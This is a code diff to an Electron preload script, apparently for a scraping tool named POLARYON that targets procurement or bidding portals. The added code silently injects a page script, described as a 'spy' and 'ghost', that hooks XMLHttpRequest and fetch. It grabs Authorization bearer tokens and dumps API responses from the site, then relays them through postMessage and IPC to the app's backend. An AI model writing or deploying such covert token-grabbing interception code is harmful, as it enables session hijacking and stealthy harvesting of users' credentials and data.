@@ -1,5 +1,124 @@
 const { ipcRenderer } = require('electron');
 
+// 🛡️ MODO HÍBRIDO: INJEÇÃO DO "FANTASMA" NO MUNDO REAL (DOM)
+window.addEventListener("message", (event) => {
+    // Escuta as mensagens do nosso fantasma injetado na aplicação
+    if (event.source === window && event.data && event.data.type === 'POLARYON_HYBRID_SPY') {
+        const payload = event.data.payload;
+        
+        // Se capturamos um token ou dados brutos, mandamos pro Backend do Electron
+        ipcRenderer.send('portal-hybrid-capture', {
+            sessionId: mySessionId || 'UNKNOWN',
+            action: payload.action,
+            data: payload
+        });
+        
+        // Log stealth local
+        if (payload.action === 'TOKEN_GRABBED') {
+             console.log("👻 [POLARYON] Token Capturado! Modo Híbrido armado.");
+             window.polaryonAuthBearer = payload.token;
+        }
+    }
+}, false);
+
+const injectSniffer = () => {
+    const script = document.createElement('script');
+    script.textContent = `
+        (function() {
+            if (window.__polaryon_sniffed) return;
+            window.__polaryon_sniffed = true;
+
+            const sendToPreload = (data) => {
+                window.postMessage({ type: 'POLARYON_HYBRID_SPY', payload: data }, '*');
+            };
+
+            // Intercept XHR
+            const OrigXHR = window.XMLHttpRequest;
+            window.XMLHttpRequest = function() {
+                const xhr = new OrigXHR();
+                const origOpen = xhr.open;
+                const origSetReqHeader = xhr.setRequestHeader;
+                
+                xhr._url = '';
+                
+                xhr.open = function(method, url) {
+                    this._url = url;
+                    return origOpen.apply(this, arguments);
+                };
+                
+                xhr.setRequestHeader = function(header, value) {
+                    if (header.toLowerCase() === 'authorization' || header.toLowerCase() === 'bearer') {
+                        sendToPreload({ action: 'TOKEN_GRABBED', token: value, url: this._url });
+                    }
+                    return origSetReqHeader.apply(this, arguments);
+                };
+                
+                xhr.addEventListener('load', function() {
+                    const url = this._url || '';
+                    if (url.includes('compras') || url.includes('disputa') || url.includes('/api/')) {
+                        try {
+                            const jsonContent = JSON.parse(this.responseText);
+                            sendToPreload({ action: 'API_DUMP', url: url, response: jsonContent });
+                        } catch(e) {}
+                    }
+                });
+                
+                return xhr;
+            };
+
+            // Intercept Fetch
+            const origFetch = window.fetch;
+            window.fetch = async function() {
+                const url = arguments[0];
+                const options = arguments[1] || {};
+                
+                if (options.headers) {
+                    let hasToken = false;
+                    try {
+                        if (options.headers.get && typeof options.headers.get === 'function') {
+                            const tk = options.headers.get('authorization') || options.headers.get('Authorization');
+                            if (tk) { sendToPreload({ action: 'TOKEN_GRABBED', token: tk, url: url }); hasToken = true; }
+                        } else {
+                            for (const [k, v] of Object.entries(options.headers)) {
+                                if (k.toLowerCase() === 'authorization') {
+                                    sendToPreload({ action: 'TOKEN_GRABBED', token: v, url: url });
+                                    hasToken = true;
+                                }
+                            }
+                        }
+                    } catch(e){}
+                }
+                
+                const response = await origFetch.apply(this, arguments);
+                if (url && typeof url === 'string' && (url.includes('compras') || url.includes('disputa') || url.includes('/api/'))) {
+                    try {
+                        const clone = response.clone();
+                        clone.json().then(data => {
+                             sendToPreload({ action: 'API_DUMP', url: url, response: data });
+                        }).catch(e=>{});
+                    } catch(e) {}
+                }
+                return response;
+            };
+            
+            console.log("👻 [POLARYON] Interceptador de Rede Ativado.");
+        })();
+    `;
+    
+    // Injeta silenciosamente
+    const inject = () => {
+        const root = document.head || document.documentElement;
+        if (root) {
+            root.appendChild(script);
+            script.remove();
+        } else {
+            setTimeout(inject, 50);
+        }
+    };
+    inject();
+};
+injectSniffer();
+
 let scrapingInterval = null;
 let serverOffset = 0;
 
